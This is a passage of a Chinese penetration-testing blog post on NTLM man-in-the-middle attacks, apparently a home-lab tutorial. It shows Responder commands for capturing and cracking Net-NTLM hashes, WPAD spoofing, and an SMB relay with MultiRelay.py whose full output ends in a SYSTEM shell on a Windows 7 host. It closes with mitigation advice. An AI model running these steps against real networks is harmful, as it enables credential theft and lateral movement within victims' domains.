+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\whoami<br></code></pre></td></tr></table></figure>
+</blockquote>
+<img align = "left" src="https://i.loli.net/2021/08/03/Gulv2Pp5fYkD1R3.png" srcset="/img/loading.gif" lazyload alt="_20210803103047" />
+<p>截获的Hash值</p>
+<img align = "left" src="https://i.loli.net/2021/08/03/8WlvOwYzhItKy1V.png" srcset="/img/loading.gif" lazyload alt="_20210803103407" style="zoom:80%;" />
+<blockquote>
+<p>Responder会将所有抓取到的数据存储到 /usr/share/responder/logs/ 文件夹下，会为每个service-proto-IP生成 唯一的文件。使用responder抓取的通常就是Net-NTLM Hash。攻击者无法使用Net-NTLM Hash进行哈希传递攻击，只能使用hashcat、John等工具爆破或进行 NTLM-Relay攻击。</p>
+</blockquote>
+<p><strong>3. 使用工具进行爆破</strong></p>
+<img align = "left" src="https://i.loli.net/2021/08/03/Q1kIBTSErnuM3tb.png" srcset="/img/loading.gif" lazyload alt="_20210803104656" style="zoom:80%;" />
+<p>得到明文密码010612和用户名John</p>
+<h2 id="利用wpad劫持获得net-ntlm-hash"><a class="markdownIt-Anchor" href="#利用wpad劫持获得net-ntlm-hash"></a> 利用WPAD劫持获得Net-NTLM Hash</h2>
+<blockquote>
+<p>Responder可以创建一个假WPAD服务器，并响应客户端的WPAD名称解析。 然后客户端请求这个假WPAD 服务器的wpad.dat文件。</p>
+</blockquote>
+<p><strong>1. 创建WPAD服务器并开启监听</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v -w -F<br></code></pre></td></tr></table></figure>
+<p><strong>2. win7操作</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">开启WPAD代理后访问网页并登陆<br></code></pre></td></tr></table></figure>
+<img align = "left" src="https://i.loli.net/2021/08/03/jzO4EcX3Jr9d5xB.png" srcset="/img/loading.gif" lazyload alt="_20210803110048" style="zoom: 80%;" />
+<p>截取的Hash值</p>
+<img align = "left" src="https://i.loli.net/2021/08/03/vlKJNuywSZckYVP.png" srcset="/img/loading.gif" lazyload alt="_20210803110309" style="zoom:80%;" />
+<h2 id="smb-relay"><a class="markdownIt-Anchor" href="#smb-relay"></a> SMB Relay</h2>
+<p>利用Responder/tools/MultiRelay.py可实现NTLM认证中继到SMB中去</p>
+<p><strong>1. 修改Responder.conf文件关闭HTTP和SMB服务器</strong></p>
+<img align = "left" src="https://i.loli.net/2021/08/03/1HmLPjrKpcZulXO.png" srcset="/img/loading.gif" lazyload alt="截图_选择区域_20210803143821" style="zoom:80%;" />
+<p><strong>2. 查看域内SMB签名开启状况</strong></p>
+<img align = "left" src="https://i.loli.net/2021/08/03/ECkNToiMGDLbFKP.png" srcset="/img/loading.gif" lazyload alt="截图_选择区域_20210803143431" style="zoom:80%;" />
+<p><strong>2. 开启监听</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v <br></code></pre></td></tr></table></figure>
+<p><strong>3. 新建终端，运行MultiRelay.py脚本</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> MultiRelay.py -t <span class="hljs-number">172.16.56.11</span> -u <span class="hljs-literal">ALL</span><br></code></pre></td></tr></table></figure>
+<p><strong>4. win sever 2008 操作</strong></p>
+<blockquote>
+<p>随便上传点SMB流量 😄</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\wuqian<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p><strong>拿到win7的shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root💀kali)-[/usr/share/responder/tools]<br>└─# python3 MultiRelay.py -t 172.16.56.11 -u ALL<br><br>Responder MultiRelay 2.5 NTLMv1/2 Relay<br><br>Send bugs/hugs/comments to: laurent.gaffie@gmail.com<br>Usernames to relay (-u) are case sensitive.<br>To kill this script hit CTRL-C.<br><br>/*<br>Use this script in combination with Responder.py for best results.<br>Make sure to set SMB and HTTP to OFF in Responder.conf.<br><br>This tool listen on TCP port 80, 3128 and 445.<br>For optimal pwnage, launch Responder only with these 2 options:<br>-rv<br>Avoid running a command that will likely prompt for information like net use, etc.<br>If you do so, use taskkill (as system) to kill the process.<br>*/<br><br>Relaying credentials for these users:<br>[&#x27;ALL&#x27;]<br><br><br>Retrieving information for 172.16.56.11...<br>SMB signing: False<br>Os version: &#x27;Windows 7 Professional 7601 Service Pack 1&#x27;<br>Hostname: &#x27;JOHN-PC&#x27;<br>Part of the &#x27;CORP&#x27; domain<br>[+] Setting up SMB relay with SMB challenge: 2a92d665043bd7d4<br>[+] Received NTLMv2 hash from: 172.16.56.10 <br>[+] Client info: [&#x27;eWindows Server 2008 HPC Edition 7601 Service Pack 1&#x27;, domain: &#x27;CORP&#x27;, signing:&#x27;False&#x27;]                                                                          <br>[+] Username: Administrator is whitelisted, forwarding credentials.<br>[+] SMB Session Auth sent.<br>[+] Looks good, Administrator has admin rights on C$.<br>[+] Authenticated.<br>[+] Dropping into Responder&#x27;s interactive shell, type &quot;exit&quot; to terminate<br><br>Available commands:<br>dump               -&gt; Extract the SAM database and print hashes.<br>regdump KEY        -&gt; Dump an HKLM registry key (eg: regdump SYSTEM)<br>read Path_To_File  -&gt; Read a file (eg: read /windows/win.ini)<br>get  Path_To_File  -&gt; Download a file (eg: get users/administrator/desktop/password.txt)<br>delete Path_To_File-&gt; Delete a file (eg: delete /windows/temp/executable.exe)<br>upload Path_To_File-&gt; Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\<br>runas  Command     -&gt; Run a command as the currently logged in user. (eg: runas whoami)<br>scan /24           -&gt; Scan (Using SMB) this /24 or /16 to find hosts to pivot to<br>pivot  IP address  -&gt; Connect to another host (eg: pivot 10.0.0.12)<br>mimi  command      -&gt; Run a remote Mimikatz 64 bits command (eg: mimi coffee)<br>mimi32  command    -&gt; Run a remote Mimikatz 32 bits command (eg: mimi coffee)<br>lcmd  command      -&gt; Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)<br>help               -&gt; Print this message.<br>exit               -&gt; Exit this shell and return in relay mode.<br>                      If you want to quit type exit and then use CTRL-C<br><br>Any other command than that will be run as SYSTEM on the target.<br><br>Connected to 172.16.56.11 as LocalSystem.<br>C:\Windows\system32\:#<br></code></pre></td></tr></table></figure>
+<img align = "left" src="https://i.loli.net/2021/08/03/i2Tfg17PoLZIbSX.png" srcset="/img/loading.gif" lazyload alt="截图_选择区域_20210803144439" style="zoom:80%;" />
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
+<p>windows的NTLM认证在多种协议例如HTTP,SMB,WPAD,MSSQL中得到广泛应用，但该认证安全性不能得到保证，可通过中间人攻击获取Hash或者中继达到域内横向渗透。如何防范是我们关心的问题</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.关闭LLMNR以及NetBIOS服务<br><span class="hljs-number">2</span>.关闭WPAD代理服务器<br><span class="hljs-number">3</span>.将域内主机<span class="hljs-built_in">ip</span>添加到本地hosts文件中<br><span class="hljs-number">4</span>.添加SMB签名<br></code></pre></td></tr></table></figure>
+<h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <strong>Reference</strong></h2>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/476984">NTLM 中继攻击的几种非主流玩法 </a></p>
+<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6761">利用 LLMNR 名称解析缺陷劫持内网指定主机会话 – Her0in | 漏洞人生 (vuln.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6762">利用 NetBIOS 协议名称解析及 WPAD 进行内网渗透 – Her0in | 漏洞人生 (vuln.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9627962db4da">SMB relay攻击复现 - 简书 (jianshu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1459.html">浅析SMB relay攻击手法_红帽社区 (redhatzone.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/244375.html">内网渗透测试：NTLM Relay攻击分析 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1b545a8b8b1e">内网渗透之Responder与Net-NTML hash - 简书 (jianshu.com)</a></p>
+</blockquote>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>基于NTLM的中间人攻击</div>
+      <div>https://blue-arc.github.io/2022/06/02/MITM/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>冰蓝弧影</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月2日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/08/AdWorld/" title="攻防世界Web新手区">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻防世界Web新手区</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/01/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TyS3NfQ1bcjfGf0GjH0Lye57-gzGzoHsz","appKey":"86iDdi7JfrLheVtpOpRWlhMk","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
